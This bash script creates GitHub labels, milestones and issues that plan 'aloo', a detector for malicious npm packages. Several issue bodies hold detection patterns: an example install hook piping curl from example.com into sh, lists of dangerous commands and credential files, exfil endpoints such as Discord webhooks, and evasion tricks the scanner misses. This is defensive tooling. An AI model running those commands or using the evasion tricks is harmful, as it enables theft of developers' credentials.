#!/usr/bin/env bash
set -euo pipefail

REPO="snigenigmatic/aloo"
PROJECT_NUMBER="2"

# ── colours ─────────────────────────────────────────────────────────────────
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

log()  { echo -e "${GREEN}✓${NC} $1"; }
warn() { echo -e "${YELLOW}⚠${NC}  $1"; }
die()  { echo -e "${RED}✗${NC}  $1"; exit 1; }

# ── preflight ────────────────────────────────────────────────────────────────
command -v gh >/dev/null 2>&1 || die "gh CLI not found. Install from https://cli.github.com"
gh auth status >/dev/null 2>&1 || die "Not authenticated. Run: gh auth login"
log "gh CLI authenticated"

# ── labels ───────────────────────────────────────────────────────────────────
echo ""
echo "Creating labels..."

declare -A LABELS=(
  ["engine"]="0075ca"
  ["signal"]="e4e669"
  ["backend"]="c5def5"
  ["loader"]="c5def5"
  ["types"]="1d76db"
  ["scoring"]="0e8a16"
  ["bench"]="f9d0c4"
  ["known-misses"]="b60205"
  ["cli"]="5319e7"
  ["mcp"]="d93f0b"
  ["testing"]="006b75"
  ["schema"]="1d76db"
  ["registry"]="0075ca"
  ["intelligence"]="e11d48"
)

for label in "${!LABELS[@]}"; do
  color="${LABELS[$label]}"
  gh label create "$label" \
    --repo "$REPO" \
    --color "$color" \
    --force 2>/dev/null && log "label: $label" || warn "label already exists: $label"
done

# ── milestones ────────────────────────────────────────────────────────────────
echo ""
echo "Creating milestones..."

MILESTONES=(
  "1 - Engine Core"
  "2 - Quality Gate"
  "3 - Distribution"
  "4 - Hardening"
  "5 - Registry"
  "6 - Intelligence"
)

for ms in "${MILESTONES[@]}"; do
  gh api \
    --method POST \
    -H "Accept: application/vnd.github+json" \
    "/repos/$REPO/milestones" \
    -f title="$ms" \
    -f state="open" 2>/dev/null && log "milestone: $ms" || warn "milestone may already exist: $ms"
done

# ── helper ────────────────────────────────────────────────────────────────────
ISSUE_URLS=()

create_issue() {
  local title="$1"
  local milestone="$2"
  local labels="$3"
  local body="$4"

  local url
  url=$(gh issue create \
    --repo "$REPO" \
    --title "$title" \
    --milestone "$milestone" \
    --label "$labels" \
    --body "$body")

  ISSUE_URLS+=("$url")
  log "issue: $title"
}

# ═════════════════════════════════════════════════════════════════════════════
# MILESTONE 1 — ENGINE CORE
# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "── Milestone 1: Engine Core ──"

create_issue \
  "Define core type contracts" \
  "1 - Engine Core" \
  "engine,types" \
  "## Context
The full data model must be locked before any detection logic is written. Every other component speaks these types. See [SPEC.md §Data schema](./SPEC.md#data-schema).

## Acceptance criteria
- [ ] \`Manifest\`, \`SourceFile\`, \`PackageVersion\` defined with all fields from the spec
- [ ] \`SourceKind\`, \`Sensitivity\`, \`SinkKind\`, \`Evidence\`, \`SourceObs\`, \`SinkObs\`, \`FlowObs\`, \`FileFacts\`, \`PackageFacts\` defined
- [ ] \`Severity\`, \`Decision\`, \`ReasonCode\`, \`Reason\`, \`Verdict\` defined
- [ ] \`Decision::exit_code()\` returns 0/1/2 for Allow/Warn/Block
- [ ] \`SourceKind::sensitivity()\` returns the correct mapping per spec
- [ ] \`Analyzer\` trait defined with \`name()\` and \`analyze_package()\` — no oxc types in signature
- [ ] \`ScoreConfig\` with default thresholds (warn 15, block 100)
- [ ] All types derive \`serde::Serialize\` / \`serde::Deserialize\` where needed
- [ ] \`Verdict\` round-trips to JSON with an \`insta\` snapshot locking field names and enum variants"

create_issue \
  "Implement HeuristicAnalyzer backend" \
  "1 - Engine Core" \
  "engine,backend" \
  "## Context
The default \`Analyzer\` implementation. Line-scan each source file with source and sink regex sets. Infer a flow by co-occurrence: a file with any source observation and a NetworkSend produces a \`FlowObs\` per distinct source kind. See [SPEC.md §Backends](./SPEC.md#backends).

## Acceptance criteria
- [ ] Implements \`Analyzer\` trait, \`name()\` returns \`\"heuristic\"\`
- [ ] Source regex set covers: \`process.env\`, \`.npmrc\`/\`NPM_TOKEN\`/\`_authToken\`, \`.ssh/\`/\`id_rsa\`, \`.aws/credentials\`/\`AWS_SECRET_ACCESS_KEY\`, \`.env\` reads, \`wallet.dat\`/\`keystore\`/\`MetaMask\`, browser \`Login Data\`/\`Cookies\`/\`leveldb\`
- [ ] Sink regex set covers: \`fetch(\`/\`http(s).request\`/\`axios\`/\`net.connect\`/\`WebSocket(\`/\`.post(\`/\`dns.\` → NetworkSend; \`child_process\`/\`execSync\`/\`exec(\`/\`spawn(\`/\`execFile\` → ProcessExec; \`eval(\`/\`new Function(\`/\`vm.runIn\` → DynamicEval; \`writeFileSync\`/\`createWriteStream\` → FilesystemWrite
- [ ] No regex uses lookaround (unsupported by the \`regex\` crate)
- [ ] File with \`process.env\` AND \`fetch(\` → \`FlowObs { source: ProcessEnv, sink: NetworkSend }\`
- [ ] File with \`process.env\` alone → \`SourceObs\`, no \`FlowObs\`
- [ ] File with \`fetch(\` alone → \`SinkObs\`, no \`FlowObs\`
- [ ] Evidence carries file path and line number"

create_issue \
  "Implement manifest signal" \
  "1 - Engine Core" \
  "engine,signal" \
  "## Context
Detects lifecycle hook presence and dangerous install-time commands. First signal pass. See [SPEC.md §Signals](./SPEC.md#signals).

## Acceptance criteria
- [ ] \`postinstall: \"node index.js\"\` → \`InstallScriptPresent\` at Medium
- [ ] \`postinstall: \"curl https://example.com/payload | sh\"\` → \`DangerousInstallScript\` at High (not InstallScriptPresent)
- [ ] Dangerous-command set: \`curl\`, \`wget\`, \`node -e\`, \`base64 -d\`, \`child_process\`, \`/dev/tcp\`, pipe to \`sh\`, \`powershell\`, \`bash -c\`
- [ ] All three hooks checked: \`preinstall\`, \`install\`, \`postinstall\`
- [ ] Package with no lifecycle scripts → empty \`Vec\`
- [ ] Evidence is the script line from \`package.json\`"

create_issue \
  "Implement entropy signal" \
  "1 - Engine Core" \
  "engine,signal" \
  "## Context
Detects obfuscated or encoded code across source files. See [SPEC.md §Signals](./SPEC.md#signals).

## Acceptance criteria
- [ ] Line with base64 run of 200+ chars → \`Obfuscation\` at Medium
- [ ] Line with 4+ chained \`String.fromCharCode()\` calls → \`Obfuscation\` at Medium
- [ ] Quoted literal 120+ chars with Shannon entropy > 4.5 → \`Obfuscation\` at Medium
- [ ] High-entropy literal under 120 chars → no trigger
- [ ] Normal readable string → no trigger
- [ ] Multiple hits in one package → single \`Obfuscation\` reason, all evidence collected
- [ ] Evidence capped at 20 entries
- [ ] \`package.json\` excluded from entropy scanning
- [ ] Shannon entropy implementation is pure std, no deps"

create_issue \
  "Implement IoC signal" \
  "1 - Engine Core" \
  "engine,signal" \
  "## Context
Deterministic high-confidence indicators: known exfil endpoints and eval-of-decoded-payload. See [SPEC.md §Signals](./SPEC.md#signals).

## Acceptance criteria
- [ ] Discord webhook URL (\`discord.com/api/webhooks/\` or \`discordapp.com\`) → \`KnownIoc\` at High
- [ ] Telegram bot URL (\`api.telegram.org/bot\`) → \`KnownIoc\` at High
- [ ] \`eval(atob(...))\`, \`eval(Buffer.from(...))\`, \`eval(unescape(...))\` → \`DynamicEval\` at High
- [ ] One reason per matched indicator, not per matched line
- [ ] Evidence capped at 10 entries per indicator
- [ ] Package with none of these → empty \`Vec\`"

create_issue \
  "Implement taint signal" \
  "1 - Engine Core" \
  "engine,signal" \
  "## Context
Turns flows from \`PackageFacts\` into \`CredentialExfiltration\` reasons. This is the wedge signal — the thing CVE matching is structurally blind to. See [SPEC.md §Signals](./SPEC.md#signals).

## Acceptance criteria
- [ ] \`FlowObs { source: NpmToken, sink: NetworkSend }\` → \`CredentialExfiltration\` at Critical
- [ ] \`FlowObs { source: ProcessEnv, sink: NetworkSend }\` → \`CredentialExfiltration\` at High (Elevated sensitivity)
- [ ] \`FlowObs { source: SshKey, sink: ProcessExec }\` → \`CredentialExfiltration\` at Critical
- [ ] No flows → empty \`Vec\`
- [ ] One reason per flow
- [ ] Evidence comes from the \`FlowObs\`"

create_issue \
  "Implement diff signal" \
  "1 - Engine Core" \
  "engine,signal" \
  "## Context
Compares current version facts against a prior version. Catches the account-takeover case where a clean, popular package goes bad in a single release — where age and reputation signals all say safe. See [SPEC.md §Signals](./SPEC.md#signals).

## Acceptance criteria
- [ ] \`FlowObs\` present in current facts and absent in prior facts → \`RiskIntroducedInRelease\` at High
- [ ] Lifecycle script present in current manifest and absent in prior manifest → \`RiskIntroducedInRelease\` at High
- [ ] Flow present in both versions → no emit
- [ ] Flow absent from both versions → no emit
- [ ] No prior version supplied → empty \`Vec\`, no panic
- [ ] Evidence names the specific introduced flow or script"

create_issue \
  "Implement deterministic scoring" \
  "1 - Engine Core" \
  "engine,scoring" \
  "## Context
Pure function over the merged reason list. No external input, no clocks, no randomness. See [SPEC.md §Scoring](./SPEC.md#scoring).

## Acceptance criteria
- [ ] Any \`Critical\` reason → \`Decision::Block\` regardless of total score
- [ ] Weights: Info 0, Low 5, Medium 15, High 40, Critical 100
- [ ] Score ≥ 100 → Block
- [ ] Score ≥ 15 and < 100 → Warn
- [ ] Score < 15 → Allow
- [ ] Table-driven tests: empty → Allow, one Medium → Warn, one Critical → Block, two High → Block, mixed below threshold → Allow
- [ ] \`ScoreConfig\` thresholds are respected; changing them changes the outcome"

create_issue \
  "Implement package loaders" \
  "1 - Engine Core" \
  "engine,loader" \
  "## Context
Two loaders that populate \`PackageVersion\` from disk. The tarball loader is the one that matters most — always analyze what you'd actually install, not the repo. See [SPEC.md §Loaders](./SPEC.md#loaders).

## Acceptance criteria
- [ ] \`from_dir\` recurses, skips \`node_modules\` and dotfiles, reads \`package.json\` + \`js cjs mjs ts jsx tsx\`, caps each file at 2 MiB, normalizes paths to forward-slash relative
- [ ] \`from_tarball\` decodes \`.tgz\`, strips \`package/\` npm prefix from entry paths, reads only manifest and code files under the cap
- [ ] A directory fixture and its tarball equivalent parse to identical file lists and identical manifest fields
- [ ] File over 2 MiB is silently skipped
- [ ] \`node_modules\` at any depth is skipped
- [ ] Tarball missing \`package.json\` returns an error"

# ═════════════════════════════════════════════════════════════════════════════
# MILESTONE 2 — QUALITY GATE
# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "── Milestone 2: Quality Gate ──"

create_issue \
  "Build bench harness and seed corpus" \
  "2 - Quality Gate" \
  "bench" \
  "## Context
The harness scores the engine against a labeled corpus and prints precision, recall, and FPR. This is the gate that makes quality claims real. Build this before the CLI. See [SPEC.md §Bench harness](./SPEC.md#bench-harness).

## Acceptance criteria
- [ ] Corpus layout: \`crates/bench/corpus/benign/<name>\` and \`crates/bench/corpus/malicious/<name>\`
- [ ] Harness loads all fixtures, evaluates each, records TP/FP/FN/TN
- [ ] Prints confusion matrix, per-fixture decision, and explicit lists of false negatives and false positives by name
- [ ] Asserts recall ≥ 0.80 on malicious set — fails with clear message if breached
- [ ] Asserts FPR ≤ 0.10 on benign set — fails with clear message if breached
- [ ] Malicious seed fixtures (inert endpoints only — \`example.com\`/\`localhost\`): postinstall token stealer, Discord webhook exfil, eval-of-base64-payload, env-to-fetch flow, dangerous curl install script
- [ ] Benign seed fixtures: legitimate \`fetch\` with no credential access, native module installer downloading from \`github.com\`, CLI tool using \`child_process\` for shell completion
- [ ] All malicious fixtures Block; all benign fixtures Allow
- [ ] No real C2 URLs, no working exploit payloads, no copied live malware"

create_issue \
  "Calibrate scoring thresholds against corpus" \
  "2 - Quality Gate" \
  "bench,scoring" \
  "## Context
Run the bench, examine false negatives and false positives, adjust thresholds and weights until the gate passes. Document the rationale for every change. See [SPEC.md §Scoring](./SPEC.md#scoring).

## Acceptance criteria
- [ ] \`cargo run -p aloo-bench\` passes recall floor and FPR ceiling
- [ ] Every threshold or weight change is accompanied by a bench run showing it helped and did not regress the other metric
- [ ] The known calibration tension is resolved or documented: an \`env → network\` flow plus a postinstall scores 55 under default weights (Warn, not Block) — the corpus decision is recorded in this issue
- [ ] No weights changed without a bench run proving the change was correct"

create_issue \
  "Add adversarial blind-spot fixtures" \
  "2 - Quality Gate" \
  "bench,known-misses" \
  "## Context
Document the heuristic backend's structural limits as named corpus fixtures that are expected to miss. Being able to name your false negatives is part of the quality claim. See [SPEC.md §Adversarial blind-spot inventory](./SPEC.md#adversarial-blind-spot-inventory).

## Acceptance criteria
- [ ] Six fixtures in \`corpus/known-misses/\`, one per blind spot:
  - \`source-via-variable\` — source assigned to a variable before the network send
  - \`sink-via-concat\` — sink name assembled by string concatenation
  - \`url-in-base64\` — exfil URL stored as base64 and decoded at runtime
  - \`computed-env-access\` — \`process['e'+'nv']\`
  - \`cross-file-flow\` — flow split across two files via a re-exported helper
  - \`runtime-fetch-payload\` — payload fetched at runtime, nothing malicious in the tarball
- [ ] Harness treats \`known-misses\` separately: prints them by name, does not count against recall floor
- [ ] Each fixture has a \`description\` field in \`package.json\` naming the blind spot and which phase addresses it (oxc or sandbox)"

# ═════════════════════════════════════════════════════════════════════════════
# MILESTONE 3 — DISTRIBUTION
# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "── Milestone 3: Distribution ──"

create_issue \
  "Build CLI" \
  "3 - Distribution" \
  "cli" \
  "## Context
The primary human-facing surface. Exit codes are the machine interface; the table is the human one. See [SPEC.md §CLI](./SPEC.md#cli).

## Acceptance criteria
- [ ] \`aloo vet <path>\` vets a package dir or tarball, prints human-readable table, exits 0/1/2
- [ ] \`aloo vet <path> --json\` prints \`Verdict\` JSON to stdout, nothing else
- [ ] \`aloo vet <path> --against <prior-path>\` loads prior version and activates diff signal
- [ ] Invalid path exits non-zero with a useful error message, not a panic
- [ ] Human-readable output shows: package name and version, decision, score, each reason with code, severity, title, evidence file and line
- [ ] Decision is coloured if the terminal supports it (Allow green, Warn yellow, Block red)
- [ ] No clap in v0; std args are enough"

create_issue \
  "Build MCP server" \
  "3 - Distribution" \
  "mcp" \
  "## Context
Exposes the engine as an MCP tool an agent calls before executing an npx command or installing a package. This is the surface that makes aloo agent-native. See [SPEC.md §MCP server](./SPEC.md#mcp-server).

## Acceptance criteria
- [ ] stdio transport, newline-delimited JSON-RPC 2.0, one object per line
- [ ] \`initialize\` returns valid protocol version, server info, and tools capability
- [ ] \`notifications/initialized\` is accepted and ignored
- [ ] \`tools/list\` returns one tool: \`vet_package\` with a documented input schema
- [ ] \`tools/call\` with \`vet_package\` runs the engine and returns \`Verdict\` as structured content plus text rendering
- [ ] \`ping\` returns empty response
- [ ] Malformed JSON input → JSON-RPC error response, never a panic
- [ ] Unknown method → JSON-RPC method-not-found error
- [ ] Synchronous, no tokio, no rmcp in v0"

create_issue \
  "MCP protocol conformance tests" \
  "3 - Distribution" \
  "mcp,testing" \
  "## Context
Automated tests for the JSON-RPC layer so protocol regressions surface immediately. See [SPEC.md §MCP server](./SPEC.md#mcp-server).

## Acceptance criteria
- [ ] Initialize handshake produces a response with required fields
- [ ] \`tools/list\` response has correct shape and names \`vet_package\`
- [ ] \`tools/call\` with a malicious fixture → \`decision: \"block\"\`
- [ ] \`tools/call\` with a benign fixture → \`decision: \"allow\"\`
- [ ] Malformed JSON line → parse error response, not a panic
- [ ] Unknown method → method-not-found error"

# ═════════════════════════════════════════════════════════════════════════════
# MILESTONE 4 — HARDENING
# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "── Milestone 4: Hardening ──"

create_issue \
  "Enforce and test engine determinism" \
  "4 - Hardening" \
  "engine,testing" \
  "## Context
Determinism is a contract, not a convention. These tests make it provable and enforce it at the compiler level. See [SPEC.md §Validation matrix](./SPEC.md#validation-matrix).

## Acceptance criteria
- [ ] Repeat-eval test: evaluate the same package twice, assert byte-identical JSON output
- [ ] Shuffle test: evaluate a package with files in shuffled order, assert identical output — requires evidence sorted before emission and \`BTreeMap\` over \`HashMap\` wherever order reaches output
- [ ] The engine crate does not compile if \`SystemTime\`, any RNG, or any socket type is imported — enforced by a \`deny\` lint or \`#[cfg]\` guard, not convention
- [ ] \`proptest\` fuzz: arbitrary file orderings produce stable verdicts"

create_issue \
  "Verdict schema snapshot and version guard" \
  "4 - Hardening" \
  "engine,schema,testing" \
  "## Context
The verdict JSON is a public API. Accidental field renames or variant changes must be caught in CI immediately. See [SPEC.md §Verdict JSON contract](./SPEC.md#verdict-json-contract).

## Acceptance criteria
- [ ] \`insta\` snapshot of a complete \`Verdict\` JSON covering all fields and all enum variant values
- [ ] Snapshot fails CI on any field rename or variant rename
- [ ] A \`CHANGELOG\` entry is required when a snapshot is intentionally updated, documenting the schema version bump"

# ═════════════════════════════════════════════════════════════════════════════
# MILESTONE 5 — REGISTRY
# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "── Milestone 5: Registry ──"

create_issue \
  "Build aloo-registry module" \
  "5 - Registry" \
  "registry" \
  "## Context
Fetches npm registry metadata and produces reasons the orchestrator merges with engine reasons before scoring. High-value cheap signals that need network — so they stay out of the pure engine. See [SPEC.md §Registry module](./SPEC.md#registry-module-phase-15-not-v0).

## Acceptance criteria
- [ ] Separate crate \`aloo-registry\`, depends on \`aloo-engine\` for types only
- [ ] Uses \`ureq\` (sync HTTP), no async
- [ ] Fetches npm registry JSON from \`https://registry.npmjs.org/<name>\`
- [ ] Produces \`Vec<Reason>\` for: maintainer change since prior version, package age under 48 hours, version velocity anomaly (3+ versions in 24 hours), missing provenance attestation
- [ ] Typosquat detection: Damerau-Levenshtein distance ≤ 2 against bundled top-1000 npm list, plus homoglyph normalization (0/O and l/1 substitutions)
- [ ] Returns error cleanly if registry is unreachable; orchestrator falls back to engine-only scoring
- [ ] No registry calls ever in \`aloo-engine\`"

# ═════════════════════════════════════════════════════════════════════════════
# MILESTONE 6 — INTELLIGENCE
# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "── Milestone 6: Intelligence ──"

create_issue \
  "Define EnrichedVerdict schema and types" \
  "6 - Intelligence" \
  "intelligence,types" \
  "## Context
Lock the enrichment schema before building the worker — same discipline as the core types. See [SPEC.md §Intelligence layer](./SPEC.md#intelligence-layer).

## Acceptance criteria
- [ ] \`AnalysisConfidence\`, \`EnrichmentStatus\`, \`NarrativeAnalysis\`, \`FalsePositiveAnalysis\`, \`CampaignCorrelation\`, \`Remediation\`, \`Enrichment\`, \`EnrichedVerdict\` defined per spec
- [ ] \`EnrichedVerdict\` carries the original \`Verdict\` as a field — not embedded, not modified
- [ ] \`EnrichedVerdict\` serializes so that \`enriched_verdict.verdict.decision\` is byte-identical to the original \`Verdict\`'s \`decision\`
- [ ] \`insta\` snapshot of a complete \`EnrichedVerdict\` JSON
- [ ] \`aloo-intelligence\` imports \`Verdict\` and \`EnrichedVerdict\` from \`aloo-engine\` for types only — no signals, no \`Analyzer\` trait, no scoring logic"

create_issue \
  "Build intelligence batch worker" \
  "6 - Intelligence" \
  "intelligence" \
  "## Context
Background job that enriches Block and Warn verdicts with narrative analysis, false-positive assessment, campaign correlation, and remediation. Never in the realtime path. See [SPEC.md §Intelligence layer](./SPEC.md#intelligence-layer).

## Acceptance criteria
- [ ] Worker pulls from Postgres queue using \`SELECT ... FOR UPDATE SKIP LOCKED\`
- [ ] Sends structured prompt to model API: package name, version, decision, score, reasons with evidence — no raw source files
- [ ] Response parsed and validated against \`Enrichment\` schema before storage
- [ ] Invalid/malformed model response → \`EnrichmentStatus::Failed\` + logged raw response, never panics, never stores partial data
- [ ] Idempotent: re-running on same (package, version) overwrites cleanly, no duplicates
- [ ] Stores \`model\` name and \`generated_at\` timestamp with every enrichment
- [ ] Retry: exponential backoff, cap at 3 attempts, then \`Failed\`
- [ ] Allow verdicts not enqueued by default"

create_issue \
  "Intelligence layer invariant tests" \
  "6 - Intelligence" \
  "intelligence,testing" \
  "## Context
The hard rule — the intelligence layer must not change the verdict decision — must be machine-checked, not documented and trusted. See [SPEC.md §Intelligence layer §Validation](./SPEC.md#intelligence-layer).

## Acceptance criteria
- [ ] Test: \`decision\` in stored \`EnrichedVerdict.verdict\` is byte-identical to the original \`Verdict\` before and after enrichment
- [ ] Test: mock model response that attempts to modify \`decision\` → \`EnrichmentStatus::Failed\`
- [ ] Test: \`EnrichmentStatus::Pending\` is never served as \`Complete\` — state machine transition test
- [ ] Test: malformed JSON model response → \`Failed\`, not a panic
- [ ] Test: re-enriching same (package, version) → exactly one row in store"

# ═════════════════════════════════════════════════════════════════════════════
# ADD ISSUES TO PROJECT BOARD
# ═════════════════════════════════════════════════════════════════════════════
echo ""
echo "Adding issues to project board $PROJECT_NUMBER..."

for url in "${ISSUE_URLS[@]}"; do
  gh project item-add "$PROJECT_NUMBER" \
    --owner "snigenigmatic" \
    --url "$url" 2>/dev/null && log "added to board: $url" || warn "could not add to board: $url"
done

# ── summary ───────────────────────────────────────────────────────────────────
echo ""
echo "────────────────────────────────────────────"
echo -e "${GREEN}Done.${NC} ${#ISSUE_URLS[@]} issues created."
echo ""
echo "Issues:"
for url in "${ISSUE_URLS[@]}"; do
  echo "  $url"
done
echo ""
echo "Project board: https://github.com/users/snigenigmatic/projects/$PROJECT_NUMBER/views/1"